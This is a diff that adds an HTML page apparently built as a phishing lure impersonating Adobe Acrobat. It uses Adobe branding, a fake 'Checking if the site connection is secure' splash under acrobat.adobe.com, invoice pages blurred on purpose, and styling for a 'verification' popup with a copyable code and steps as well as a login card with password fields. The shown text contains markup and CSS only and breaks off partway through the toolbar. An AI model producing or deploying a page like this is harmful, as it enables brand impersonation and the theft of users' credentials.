@@ -1,0 +1,909 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Adobe Acrobat</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 256 256'%3E%3Cpath fill='%23FA0F00' d='M45.257 0h165.485C235.886 0 256 20.114 256 45.257v165.486C256 235.886 235.886 256 210.742 256H45.257C20.114 256 0 235.886 0 210.743V45.257C0 20.114 20.114 0 45.257 0z'/%3E%3Cpath fill='%23FFF' d='M204.144 147.657c-11.887-12.343-44.344-7.314-52.115-6.4-11.428-10.972-19.199-24.229-21.942-28.8 4.114-12.343 6.856-24.686 7.314-37.942 0-11.429-4.571-23.771-17.372-23.771-4.571 0-8.686 2.742-10.972 6.399-5.485 9.601-3.2 28.801 5.486 48.458-5.028 14.171-9.6 27.885-22.4 52.114-13.257 5.484-41.143 18.285-43.429 32-.914 4.113.457 8.229 3.657 11.428 3.2 2.743 7.314 4.114 11.429 4.114 16.914 0 33.371-23.313 44.8-42.972 9.6-3.199 24.686-7.771 39.772-10.514 17.828 15.543 33.371 17.828 41.6 17.828 10.971 0 15.086-4.571 16.457-8.686 2.285-4.57.914-9.599-2.285-13.256zm-11.43 7.772c-.457 3.2-4.57 6.399-11.885 4.571-8.686-2.285-16.457-6.4-23.314-11.886 5.943-.915 19.199-2.286 28.8-.457 3.657.914 7.314 3.2 6.399 7.772zm-76.342-94.172c.914-1.371 2.286-2.285 3.657-2.285 4.114 0 5.028 5.028 5.028 9.143-.457 9.601-2.286 19.2-5.485 28.343-6.858-18.286-5.486-31.087-3.2-35.201zm-.914 88.686c3.657-7.314 8.686-20.115 10.514-25.601 4.114 6.856 10.971 15.086 14.629 18.743 0 .458-14.172 3.2-25.143 6.858zm-26.972 18.286C77.972 185.6 67 196.571 61.057 196.571c-.914 0-1.829-.457-2.743-.914-1.372-.915-1.829-2.286-1.372-4.114 1.372-6.4 13.258-15.086 31.544-23.314z'/%3E%3C/svg%3E">
+<link href="https://fonts.googleapis.com/css2?family=Source+Sans+3:wght@400;500;600;700&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#1a1a1a;--chrome:#2a2a2a;--text:#e8e8e8;--blue:#2680EB;--blue2:#1473E6;--red:#FA0F00;
+  --tool:48px;--top:48px;--bot:36px;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html,body{height:100%;overflow:hidden;background:var(--bg);color:var(--text);
+  font-family:'Source Sans 3',adobe-clean,-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
+  -webkit-font-smoothing:antialiased;user-select:none}
+button{font-family:inherit;border:none;background:none;color:inherit;cursor:pointer;padding:0}
+.hidden{display:none!important}
+
+/* Acrobat product mark */
+.ac-mark{display:block}
+
+/* Splash */
+#splash{position:fixed;inset:0;z-index:50;background:#1a1a1a;display:flex;flex-direction:column;align-items:center;transition:opacity .45s ease}
+#splash.out{opacity:0;pointer-events:none}
+.sp-main,.sp-foot{width:min(720px,86vw)}
+.sp-main{flex:1;display:flex;flex-direction:column;align-items:flex-start;padding-top:16vh}
+.sp-brand{display:flex;align-items:center;gap:12px;margin-bottom:18px}
+.sp-logo{width:40px;height:40px;flex-shrink:0;filter:drop-shadow(0 1px 2px rgba(0,0,0,.35))}
+.sp-logo .ac-mark{width:40px;height:40px}
+.sp-host{font-size:22px;font-weight:700;color:#fff;letter-spacing:-.2px}
+.sp-msg{font-size:16.5px;font-weight:600;color:#d0d0d0;margin-bottom:22px}
+.sp-spin{width:28px;height:28px;animation:spin .75s linear infinite}
+@keyframes spin{to{transform:rotate(360deg)}}
+.sp-foot{padding:0 0 28px;display:flex;flex-direction:column;align-items:center;gap:10px}
+.sp-rule{width:100%;height:2px;background:#3a3a3a}
+.sp-ray{font-size:13px;font-weight:600;color:#7a7a7a;letter-spacing:.2px}
+.sp-by{font-size:14.5px;font-weight:700;color:#b0b0b0}
+
+/* Shell */
+#app{position:fixed;inset:0;display:flex;flex-direction:column;opacity:0;transform:scale(.992);transition:opacity .5s ease,transform .5s ease}
+#app.on{opacity:1;transform:none}
+
+.top{height:var(--top);background:var(--chrome);border-bottom:1px solid #222;display:flex;align-items:center;padding:0 8px 0 10px;flex-shrink:0;z-index:8;gap:4px;position:relative}
+.top-logo{width:28px;height:28px;flex-shrink:0;margin-right:8px}
+.top-logo .ac-mark{width:28px;height:28px}
+.doc-btn{display:flex;align-items:center;gap:8px;height:32px;padding:0 10px;border-radius:6px;max-width:min(420px,46vw);color:var(--text)}
+.doc-btn:hover{background:rgba(255,255,255,.06)}
+.doc-btn.open{background:rgba(255,255,255,.08)}
+.doc-share-label{display:inline-flex;align-items:center;gap:6px;flex-shrink:0}
+.doc-cloud{width:15px;height:15px;color:#c4c4c4;flex-shrink:0;display:block}
+.doc-shared{font-size:13px;color:#c4c4c4;font-weight:500;white-space:nowrap}
+.doc-pipe{color:#6a6a6a}
+.dn{font-size:13px;font-weight:600;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;max-width:240px;display:inline-block;vertical-align:bottom}
+.chev{width:12px;height:12px;color:#9a9a9a;flex-shrink:0;margin-left:2px}
+.top-sp{flex:1}
+.top-r{display:flex;align-items:center;gap:2px}
+.ib{width:36px;height:32px;border-radius:6px;display:flex;align-items:center;justify-content:center;color:#cfcfcf}
+.ib:hover{background:rgba(255,255,255,.08);color:#fff}
+.ib svg{width:18px;height:18px}
+.share{height:32px;padding:0 14px;margin-left:6px;border-radius:16px;background:var(--blue);color:#fff;font-size:13px;font-weight:600;display:flex;align-items:center;gap:6px}
+.share:hover{background:var(--blue2)}
+.share svg{width:14px;height:14px}
+.av{width:28px;height:28px;border-radius:50%;background:#4a4a4a;margin-left:8px;display:flex;align-items:center;justify-content:center;color:#ddd}
+.av svg{width:16px;height:16px}
+
+.menu{position:absolute;top:44px;left:46px;min-width:260px;background:#2f2f2f;border:1px solid #444;border-radius:8px;padding:6px 0;box-shadow:0 12px 40px rgba(0,0,0,.5);z-index:20}
+.mi{display:flex;align-items:center;gap:10px;padding:8px 14px;font-size:13px;color:#e6e6e6;width:100%;text-align:left}
+.mi:hover{background:#3a3a3a}
+.mi svg{width:16px;height:16px;color:#b0b0b0}
+.mi kbd{margin-left:auto;font-size:11px;color:#7a7a7a;font-family:inherit}
+.sep{height:1px;background:#444;margin:6px 0}
+
+.body{flex:1;display:flex;min-height:0;position:relative}
+.rail{position:absolute;left:10px;top:50%;transform:translateY(-50%);z-index:7;width:auto;background:none;border:none;padding:0;pointer-events:none}
+.rail-panel{width:48px;box-sizing:border-box;background:#2c2c2c;border:1px solid #545454;border-radius:8px;padding:8px 0 10px;display:flex;flex-direction:column;align-items:center;box-shadow:0 6px 22px rgba(0,0,0,.55);pointer-events:auto}
+.rail-handle{width:26px;height:3px;border-radius:2px;background:#a5a5a5;margin-bottom:8px}
+.tb{position:relative;width:36px;height:36px;border-radius:6px;display:flex;align-items:center;justify-content:center;margin-bottom:6px;color:#cfcfcf;cursor:pointer}
+.tb svg{width:20px;height:20px;display:block}
+.tb:hover{background:rgba(255,255,255,.06)}
+.tb.on{background:#3c6de0;color:#fff}
+.tb.on:hover{background:#3c6de0}
+.tb-caret{position:absolute;right:3px;bottom:3px;width:0;height:0;border-left:5px solid transparent;border-bottom:5px solid #b6b6b6}
+.tb.on .tb-caret{border-bottom-color:#fff}
+.tb-more{height:28px;margin-bottom:0;gap:4px}
+.tb-more .dot{width:3px;height:3px;border-radius:50%;background:currentColor}
+.tip{position:absolute;left:42px;top:50%;transform:translateY(-50%);background:#1c1c1c;color:#fff;font-size:12px;padding:5px 8px;border-radius:4px;white-space:nowrap;pointer-events:none;opacity:0;box-shadow:0 4px 16px rgba(0,0,0,.45);border:1px solid #3a3a3a;z-index:30}
+.tb:hover .tip{opacity:1}
+
+.canvas{flex:1;background:#323232;position:relative;overflow:hidden;min-height:0}
+.scroller{position:absolute;inset:0;overflow:auto;display:none;z-index:1}
+.scroller.on{display:block}
+.pages{display:flex;flex-direction:column;align-items:center;padding:28px 24px 80px;gap:18px;transform-origin:top center}
+
+/* Loading */
+.load{position:absolute;inset:0;z-index:3;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:22px;background:#161616}
+.load.fade{opacity:0;transition:opacity .35s ease;pointer-events:none}
+.wm{color:#5a5a5a}
+.wm .ac-mark{width:96px;height:92px}
+.bar-wrap{width:168px;height:3px;background:#2c2c2c;border-radius:3px;overflow:hidden}
+.bar{height:100%;width:8%;background:linear-gradient(90deg,#1473E6,#4da3ff);border-radius:3px;transition:width .35s cubic-bezier(.2,.7,.2,1)}
+.load-lbl{font-size:11px;color:#555;margin-top:-12px}
+
+/* Real invoice pages (Acrobat-sized, then blurred) */
+.sheet{width:min(816px,92%);aspect-ratio:8.5/11;background:#fff;color:#1a1a1a;box-shadow:0 1px 3px rgba(0,0,0,.28),0 8px 28px rgba(0,0,0,.22);
+  overflow:hidden;filter:blur(4.5px);font-family:Georgia,'Times New Roman',serif;user-select:none;pointer-events:none}
+.inv{padding:48px 56px 40px;height:100%;display:flex;flex-direction:column;box-sizing:border-box}
+.inv-top{display:flex;justify-content:space-between;align-items:flex-start;margin-bottom:28px;padding-bottom:18px;border-bottom:3px solid #1a1a1a}
+.inv-co h1{font-family:'Source Sans 3',sans-serif;font-size:22px;font-weight:700;letter-spacing:.4px;color:#111}
+.inv-co p{font-family:'Source Sans 3',sans-serif;font-size:11px;color:#555;line-height:1.55;margin-top:8px}
+.inv-mark{text-align:right}
+.inv-mark .word{font-family:'Source Sans 3',sans-serif;font-size:34px;font-weight:800;letter-spacing:3px;color:#111}
+.inv-mark .meta{font-family:'Source Sans 3',sans-serif;font-size:11.5px;color:#444;margin-top:6px;line-height:1.6}
+.inv-cols{display:flex;gap:32px;margin-bottom:22px}
+.inv-cols h3{font-family:'Source Sans 3',sans-serif;font-size:10px;letter-spacing:1.2px;text-transform:uppercase;color:#888;margin-bottom:6px}
+.inv-cols p{font-size:12.5px;line-height:1.55;color:#222}
+.inv table{width:100%;border-collapse:collapse;font-size:12px;margin-top:4px}
+.inv thead th{font-family:'Source Sans 3',sans-serif;font-size:10px;letter-spacing:.8px;text-transform:uppercase;text-align:left;padding:8px 10px;background:#1a1a1a;color:#fff;font-weight:600}
+.inv thead th.r,.inv td.r{text-align:right}
+.inv tbody td{padding:10px;border-bottom:1px solid #e6e6e6;color:#222}
+.inv tbody tr:nth-child(even) td{background:#f7f7f7}
+.inv-tot{margin-left:auto;width:46%;margin-top:16px}
+.inv-tot div{display:flex;justify-content:space-between;padding:6px 4px;font-size:12.5px;color:#333}
+.inv-tot .grand{border-top:2px solid #111;margin-top:6px;padding-top:10px;font-family:'Source Sans 3',sans-serif;font-weight:800;font-size:15px;color:#111}
+.inv-foot{margin-top:auto;padding-top:16px;border-top:1px solid #ddd;font-family:'Source Sans 3',sans-serif;font-size:10.5px;color:#666;display:flex;justify-content:space-between}
+.inv h2.sec{font-family:'Source Sans 3',sans-serif;font-size:13px;letter-spacing:.6px;text-transform:uppercase;margin:0 0 12px;color:#111}
+.inv .terms p{font-size:11.5px;line-height:1.65;color:#333;margin-bottom:10px}
+.inv .bank{background:#f4f4f4;padding:14px 16px;margin:16px 0 20px;font-size:12px;line-height:1.6}
+.inv .sigrow{display:flex;gap:40px;margin-top:28px}
+.inv .sig{flex:1}
+.inv .sig span{display:block;font-family:'Source Sans 3',sans-serif;font-size:10px;color:#888;text-transform:uppercase;letter-spacing:.8px}
+.inv .sig b{display:block;margin-top:28px;border-top:1px solid #222;padding-top:6px;font-size:12px;font-weight:400}
+
+/* Popup — Adobe verification card, fixed over canvas */
+.modal{position:absolute;inset:0;display:flex;align-items:center;justify-content:center;z-index:12;pointer-events:none;padding:16px}
+.card{width:min(400px,94%);background:#3a0404;border-radius:10px;overflow:hidden;box-shadow:0 22px 60px rgba(0,0,0,.5);border:1px solid #d6d6d6;
+  opacity:0;transform:translateY(18px) scale(.94);pointer-events:none;color:#1a1a1a}
+.modal.on .card{animation:pop .48s cubic-bezier(.16,1,.3,1) forwards;pointer-events:auto}
+@keyframes pop{
+  0%{opacity:0;transform:translateY(22px) scale(.92)}
+  70%{opacity:1;transform:translateY(-3px) scale(1.01)}
+  100%{opacity:1;transform:none}
+}
+.card-accent{height:4px;background:#FA0F00}
+.card-top{display:flex;align-items:center;gap:10px;padding:16px 20px 4px}
+.card-top .ac-mark{width:28px;height:28px}
+.card-brand{font-size:14px;font-weight:700;color:#1a1a1a;letter-spacing:-.1px}
+.card-body{padding:10px 22px 22px}
+.ct{font-size:18px;font-weight:700;color:#111;letter-spacing:-.3px;text-align:left}
+.cdsc{font-size:13px;color:#6b6b6b;line-height:1.5;margin-top:6px;text-align:left}
+.cs{background:#1a1a1a;border-radius:8px;padding:16px 16px 14px;margin:16px 0 14px;text-align:center}
+.cl{color:#8a8a8a;font-size:10px;text-transform:uppercase;letter-spacing:1.4px;font-weight:600;margin-bottom:8px}
+.cv{font-size:28px;font-weight:700;color:#fff;font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;letter-spacing:6px;cursor:pointer}
+.cv:hover{color:#FA0F00}
+.cpb{background:rgba(255,255,255,.1);color:#fff;border:1px solid rgba(255,255,255,.16);padding:6px 14px;border-radius:16px;font-size:12px;font-weight:600;cursor:pointer;margin-top:10px;font-family:inherit}
+.cpb:hover{background:rgba(255,255,255,.18)}
+.ss{display:flex;gap:6px;margin-bottom:16px}
+.step{flex:1;background:#f5f5f5;border-radius:8px;padding:10px 6px;text-align:center}
+.sn{width:20px;height:20px;background:#FA0F00;color:#fff;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;font-size:10px;font-weight:700;margin-bottom:4px}
+.step-text{font-size:11px;color:#555;line-height:1.3;font-weight:500}
+.bp{width:100%;height:40px;background:#FA0F00;border:none;border-radius:20px;color:#fff;font-size:14px;font-weight:600;cursor:pointer;font-family:inherit;display:flex;align-items:center;justify-content:center;gap:8px}
+.bp:hover{background:#d40e00}
+.bp:disabled,.bp.bp-locked{opacity:.5;cursor:not-allowed;pointer-events:none}
+.bp svg{width:16px;height:16px}
+.sf{display:flex;align-items:center;justify-content:center;gap:6px;margin-top:14px;color:#999;font-size:11px;font-weight:500}
+.sf svg{width:12px;height:12px;color:#22c55e;flex-shrink:0}
+.sc,.lc,.ec{text-align:center;padding:28px 8px 12px}
+.state-icon{width:52px;height:52px;border-radius:50%;display:inline-flex;align-items:center;justify-content:center;margin-bottom:14px}
+.sc .state-icon{background:#f0fdf4}
+.ec .state-icon{background:#fef2f2}
+.sc h2,.ec h2{font-size:18px;font-weight:700;color:#111;margin-bottom:6px}
+.sc p,.ec p,.lc p{color:#777;font-size:13px}
+.sl{width:36px;height:36px;animation:spin .8s linear infinite;margin-bottom:14px}
+
+.bot{height:var(--bot);background:var(--chrome);border-top:1px solid #222;display:flex;align-items:center;padding:0 12px;gap:10px;flex-shrink:0;z-index:8}
+.pg{font-size:12px;color:#b0b0b0;min-width:52px}
+.bot-sp{flex:1}
+.zoom-row{display:flex;align-items:center;gap:8px}
+.zb{width:28px;height:24px;border-radius:4px;display:flex;align-items:center;justify-content:center;color:#c0c0c0}
+.zb:hover{background:#3a3a3a;color:#fff}
+.zb svg{width:14px;height:14px}
+input[type=range]{-webkit-appearance:none;appearance:none;width:110px;height:4px;background:#4a4a4a;border-radius:4px;outline:none}
+input[type=range]::-webkit-slider-thumb{-webkit-appearance:none;width:12px;height:12px;border-radius:50%;background:#e8e8e8;cursor:pointer;box-shadow:0 0 0 1px #111}
+input[type=range]::-moz-range-thumb{width:12px;height:12px;border-radius:50%;background:#e8e8e8;border:0;cursor:pointer}
+.zp{font-size:12px;color:#d0d0d0;min-width:38px;text-align:right;font-variant-numeric:tabular-nums}
+.login-card {
+    position: relative;
+    z-index: 1;
+    width: 100%;
+    max-width: 420px;
+    padding: 48px 40px;
+    background: rgba(84, 133, 223, 0.05);
+    backdrop-filter: blur(20px);
+    -webkit-backdrop-filter: blur(20px);
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    border-radius: 24px;
+    box-shadow: 
+      0 25px 50px -12px rgba(0, 0, 0, 0.5),
+      inset 0 1px 0 rgba(255, 255, 255, 0.1);
+  }
+
+  .login-card h2 {
+    color: #fff;
+    font-weight: 600;
+    font-size: 1.75rem;
+    margin-bottom: 8px;
+    letter-spacing: -0.5px;
+  }
+
+  .login-card p {
+    color: rgba(255, 255, 255, 0.5);
+    font-size: 0.9rem;
+    margin-bottom: 36px;
+  }
+
+  .input-group {
+    position: relative;
+    margin-bottom: 28px;
+  }
+
+  .input-group label {
+    position: absolute;
+    left: 18px;
+    top: 50%;
+    transform: translateY(-50%);
+    color: rgba(255, 255, 255, 0.4);
+    font-size: 0.95rem;
+    pointer-events: none;
+    transition: all 0.25s cubic-bezier(0.4, 0, 0.2, 1);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+
+  .input-group label svg {
+    width: 18px;
+    height: 18px;
+    stroke: currentColor;
+    flex-shrink: 0;
+  }
+
+  .input-group input {
+    width: 100%;
+    padding: 18px 18px 18px 52px;
+    background: rgba(255, 255, 255, 0.04);
+    border: 1px solid rgba(255, 255, 255, 0.08);
+    border-radius: 14px;
+    color: #fff;
+    font-size: 0.95rem;
+    font-family: inherit;
+    outline: none;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+  }
+
+  .input-group input:focus {
+    background: rgba(255, 255, 255, 0.07);
+    border-color: rgba(237, 58, 58, 0.6);
+    box-shadow: 
+      0 0 0 4px rgba(237, 70, 58, 0.15),
+      0 8px 20px -6px rgba(237, 67, 58, 0.3);
+  }
+
+  .input-group input:focus + label,
+  .input-group input:not(:placeholder-shown) + label {
+    top: 0;
+    left: 14px;
+    transform: translateY(-50%) scale(0.85);
+    background: linear-gradient(to bottom, #1a1635, #1e1a3a);
+    padding: 0 8px;
+    color: #fa8b8b;
+    border-radius: 6px;
+  }
+
+  .input-group input:focus + label svg,
+  .input-group input:not(:placeholder-shown) + label svg {
+    stroke: #a78bfa;
+  }
+
+  /* Password toggle */
+  .toggle-password {
+    position: absolute;
+    right: 16px;
+    top: 50%;
+    transform: translateY(-50%);
+    background: none;
+    border: none;
+    cursor: pointer;
+    color: rgba(255, 255, 255, 0.35);
+    padding: 6px;
+    border-radius: 8px;
+    transition: all 0.2s;
+  }
+
+  .toggle-password:hover {
+    color: rgba(255, 255, 255, 0.7);
+    background: rgba(255, 255, 255, 0.05);
+  }
+
+  .toggle-password svg {
+    width: 20px;
+    height: 20px;
+    display: block;
+  }
+
+  .login-btn {
+    width: 100%;
+    padding: 16px;
+    margin-top: 8px;
+    background: linear-gradient(135deg, #ed3a3a, #cd0303);
+    border: none;
+    border-radius: 14px;
+    color: white;
+    font-size: 1rem;
+    font-weight: 500;
+    font-family: inherit;
+    cursor: pointer;
+    transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+    box-shadow: 0 10px 25px -5px rgba(237, 58, 58, 0.4);
+    position: relative;
+    overflow: hidden;
+  }
+
+  .login-btn::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: -100%;
+    width: 100%;
+    height: 100%;
+    background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+    transition: 0.5s;
+  }
+
+  .login-btn:hover {
+    transform: translateY(-2px);
+    box-shadow: 0 15px 30px -5px rgba(228, 47, 44, 0.5);
+  }
+
+  .login-btn:hover::before {
+    left: 100%;
+  }
+
+  .login-btn:active {
+    transform: translateY(0);
+  }
+
+  .extra {
+    margin-top: 28px;
+    text-align: center;
+    font-size: 0.875rem;
+    color: rgba(255, 255, 255, 0.4);
+  }
+
+  .extra a {
+    color: #a78bfa;
+    text-decoration: none;
+    font-weight: 500;
+    transition: color 0.2s;
+  }
+
+  .extra a:hover {
+    color: #c4b5fd;
+  }
+
+</style>
+</head>
+<body>
+
+<svg xmlns="http://www.w3.org/2000/svg" style="position:absolute;width:0;height:0;overflow:hidden" aria-hidden="true">
+  <symbol id="acrobat-logo" viewBox="0 0 256 256">
+    <path fill="#FA0F00" d="M45.257 0h165.485C235.886 0 256 20.114 256 45.257v165.486C256 235.886 235.886 256 210.742 256H45.257C20.114 256 0 235.886 0 210.743V45.257C0 20.114 20.114 0 45.257 0z"/>
+    <path fill="#FFF" d="M204.144 147.657c-11.887-12.343-44.344-7.314-52.115-6.4-11.428-10.972-19.199-24.229-21.942-28.8 4.114-12.343 6.856-24.686 7.314-37.942 0-11.429-4.571-23.771-17.372-23.771-4.571 0-8.686 2.742-10.972 6.399-5.485 9.601-3.2 28.801 5.486 48.458-5.028 14.171-9.6 27.885-22.4 52.114-13.257 5.484-41.143 18.285-43.429 32-.914 4.113.457 8.229 3.657 11.428 3.2 2.743 7.314 4.114 11.429 4.114 16.914 0 33.371-23.313 44.8-42.972 9.6-3.199 24.686-7.771 39.772-10.514 17.828 15.543 33.371 17.828 41.6 17.828 10.971 0 15.086-4.571 16.457-8.686 2.285-4.57.914-9.599-2.285-13.256zm-11.43 7.772c-.457 3.2-4.57 6.399-11.885 4.571-8.686-2.285-16.457-6.4-23.314-11.886 5.943-.915 19.199-2.286 28.8-.457 3.657.914 7.314 3.2 6.399 7.772zm-76.342-94.172c.914-1.371 2.286-2.285 3.657-2.285 4.114 0 5.028 5.028 5.028 9.143-.457 9.601-2.286 19.2-5.485 28.343-6.858-18.286-5.486-31.087-3.2-35.201zm-.914 88.686c3.657-7.314 8.686-20.115 10.514-25.601 4.114 6.856 10.971 15.086 14.629 18.743 0 .458-14.172 3.2-25.143 6.858zm-26.972 18.286C77.972 185.6 67 196.571 61.057 196.571c-.914 0-1.829-.457-2.743-.914-1.372-.915-1.829-2.286-1.372-4.114 1.372-6.4 13.258-15.086 31.544-23.314z"/>
+  </symbol>
+  <symbol id="acrobat-mark" viewBox="52 50 160 154">
+    <path fill="currentColor" d="M204.144 147.657c-11.887-12.343-44.344-7.314-52.115-6.4-11.428-10.972-19.199-24.229-21.942-28.8 4.114-12.343 6.856-24.686 7.314-37.942 0-11.429-4.571-23.771-17.372-23.771-4.571 0-8.686 2.742-10.972 6.399-5.485 9.601-3.2 28.801 5.486 48.458-5.028 14.171-9.6 27.885-22.4 52.114-13.257 5.484-41.143 18.285-43.429 32-.914 4.113.457 8.229 3.657 11.428 3.2 2.743 7.314 4.114 11.429 4.114 16.914 0 33.371-23.313 44.8-42.972 9.6-3.199 24.686-7.771 39.772-10.514 17.828 15.543 33.371 17.828 41.6 17.828 10.971 0 15.086-4.571 16.457-8.686 2.285-4.57.914-9.599-2.285-13.256zm-11.43 7.772c-.457 3.2-4.57 6.399-11.885 4.571-8.686-2.285-16.457-6.4-23.314-11.886 5.943-.915 19.199-2.286 28.8-.457 3.657.914 7.314 3.2 6.399 7.772zm-76.342-94.172c.914-1.371 2.286-2.285 3.657-2.285 4.114 0 5.028 5.028 5.028 9.143-.457 9.601-2.286 19.2-5.485 28.343-6.858-18.286-5.486-31.087-3.2-35.201zm-.914 88.686c3.657-7.314 8.686-20.115 10.514-25.601 4.114 6.856 10.971 15.086 14.629 18.743 0 .458-14.172 3.2-25.143 6.858zm-26.972 18.286C77.972 185.6 67 196.571 61.057 196.571c-.914 0-1.829-.457-2.743-.914-1.372-.915-1.829-2.286-1.372-4.114 1.372-6.4 13.258-15.086 31.544-23.314z"/>
+  </symbol>
+</svg>
+
+<div id="splash">
+  <div class="sp-main">
+    <div class="sp-brand">
+      <div class="sp-logo"><svg class="ac-mark"><use href="#acrobat-logo" xlink:href="#acrobat-logo"/></svg></div>
+      <div class="sp-host">acrobat.adobe.com</div>
+    </div>
+    <div class="sp-msg">Checking if the site connection is secure</div>
+    <svg class="sp-spin" viewBox="0 0 24 24" fill="none" aria-hidden="true">
+      <circle cx="12" cy="12" r="9" stroke="#3a3a3a" stroke-width="2.4"/>
+      <path d="M21 12a9 9 0 0 0-9-9" stroke="#e8e8e8" stroke-width="2.4" stroke-linecap="round"/>
+    </svg>
+  </div>
+  <div class="sp-foot">
+    <div class="sp-rule"></div>
+    <div class="sp-ray" id="ray"></div>
+    <div class="sp-by">Performance &amp; security by Acrobat</div>
+  </div>
+</div>
+
+<div id="app">
+  <header class="top">
+    <div class="top-logo" title="Adobe Acrobat"><svg class="ac-mark"><use href="#acrobat-logo" xlink:href="#acrobat-logo"/></svg></div>
+    <button class="doc-btn" id="docBtn" type="button" aria-haspopup="true" aria-expanded="false">
+      <span class="doc-share-label">
+        <svg class="doc-cloud" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
+          <path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/>
+        </svg>
+        <span class="doc-shared">Shared</span>
+      </span>
+      <span class="doc-pipe">|</span>
+      <span class="dn">Secured Document Access - 04939590939803 -2026</span>
+      <svg class="chev" viewBox="0 0 12 12" fill="none"><path d="M3 4.5L6 7.5L9 4.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>
+    </button>
+    <div class="menu hidden" id="docMenu">
+      <button class="mi" type="button" data-act="open"><svg viewBox="0 0 16 16" fill="none"><path d="M2.5 4.5h5l1 1.5H13.5v7H2.5v-8.5z" stroke="currentColor" stroke-width="1.2"/></svg>Open document</button>
+      <button class="mi" type="button" id="menuDl"><svg viewBox="0 0 16 16" fill="none"><path d="M8 2.5v8M5 8.5l3 3 3-3M3 13.5h10" stroke="currentColor" stroke-width="1.3" stroke-linecap="round" stroke-linejoin="round"/></svg>Download PDF<kbd>⌘S</kbd></button>
+      <button class="mi" type="button"><svg viewBox="0 0 16 16" fill="none"><path d="M4 6V3h8v3M4 10.5H3A1.5 1.5 0 0 1 1.5 9V7.5A1.5 1.5 0 0 1 3 6h10a1.5 1.5 0 0 1 1.5 1.5V9A1.5 1.5 0 0 1 13 10.5h-1M4 9.5h8v4H4v-4z" stroke="currentColor" stroke-width="1.2"/></svg>Print<kbd>⌘P</kbd></button>
+      <div class="sep"></div>
+      <button class="mi" type="button"><svg viewBox="0 0 16 16" fill="none"><circle cx="8" cy="8" r="5.5" stroke="currentColor" stroke-width="1.2"/><path d="M8 7.2V11M8 5.2v.4" stroke="currentColor" stroke-width="1.3" stroke-linecap="round"/></svg>Document properties</button>
+    </div>
+    <div class="top-sp"></div>
+    <div class="top-r">
+      <button class="ib" type="button" title="Search" id="btnSearch"><svg viewBox="0 0 20 20" fill="none"><circle cx="9" cy="9" r="5.5" stroke="currentColor" stroke-width="1.6"/><path d="M13.2 13.2L17 17" stroke="currentColor" stroke-width="1.6" stroke-linecap="round"/></svg></button>
+      <button class="ib" type="button" title="Comments"><svg viewBox="0 0 20 20" fill="none"><path d="M4 5.2A1.2 1.2 0 0 1 5.2 4h9.6A1.2 1.2 0 0 1 16 5.2v6.1a1.2 1.2 0 0 1-1.2 1.2H8.2L4 16V5.2z" stroke="currentColor" stroke-width="1.5"/></svg></button>
+      <button class="share" type="button" id="btnShare"><svg viewBox="0 0 16 16" fill="none"><path d="M3.5 8v4.5A1.5 1.5 0 0 0 5 14h6a1.5 1.5 0 0 0 1.5-1.5V8M8 10V2.5M5.5 4.5 8 2l2.5 2.5" stroke="currentColor" stroke-width="1.4" stroke-linecap="round" stroke-linejoin="round"/></svg>Share</button>
+      <div class="av" title="Account"><svg viewBox="0 0 20 20" fill="currentColor"><path d="M10 10.4a3.2 3.2 0 1 0 0-6.4 3.2 3.2 0 0 0 0 6.4zm0 1.4c-3.1 0-6.2 1.6-6.2 3.4V17h12.4v-1.8c0-1.8-3.1-3.4-6.2-3.4z"/></svg></div>
+    </div>
+  </header>
+
+  <div class="body">
+    <aside class="rail" aria-label="Tools">
+      <div class="rail-panel">
+        <div class="rail-handle" aria-hidden="true"></div>
+
+        <button class="tb on" type="button" data-tool="select" aria-pressed="true">
+          <svg width="26" height="26" viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M6 2.6 L6 19.4 L10.4 15.2 L13 21 L15.6 19.8 L13 14.2 L18.6 14.2 Z" fill="currentColor"/>
+          </svg>
+          <span class="tb-caret" aria-hidden="true"></span>
+          <span class="tip">Select</span>
+        </button>
+
+        <button class="tb" type="button" data-tool="comment" aria-pressed="false">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M12 3.6c-4.7 0-8.4 3.2-8.4 7.2 0 4 3.7 7.2 8.4 7.2.55 0 1.09-.04 1.6-.13l4.3 2.5-.9-3.9c1.86-1.32 3-3.32 3-5.67 0-4-3.8-7.2-8-7.2Z"/>
+            <path d="M8.2 9.4h7.6M8.2 12.6h4.8"/>
+          </svg>
+          <span class="tb-caret" aria-hidden="true"></span>
+          <span class="tip">Comment</span>
+        </button>
+
+        <button class="tb" type="button" data-tool="highlight" aria-pressed="false">
+          <svg width="26" height="26" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+            <path d="M3.6 20.4 4.7 16.6 15.9 5.4a1.9 1.9 0 0 1 2.7 0l1.2 1.2a1.9 1.9 0 0 1 0 2.7L8.6 20.4Z"/>
+            <path d="M14.4 6.9 17.7 10.2"/>
+            <path d="M4.7 16.6 8.6 20.4 3.6 20.4Z" fill="currentColor"/>
+          </svg>
+          <span class="tb-caret" aria-hidden="true"></span>
+          <span class="tip">Highlight</span>
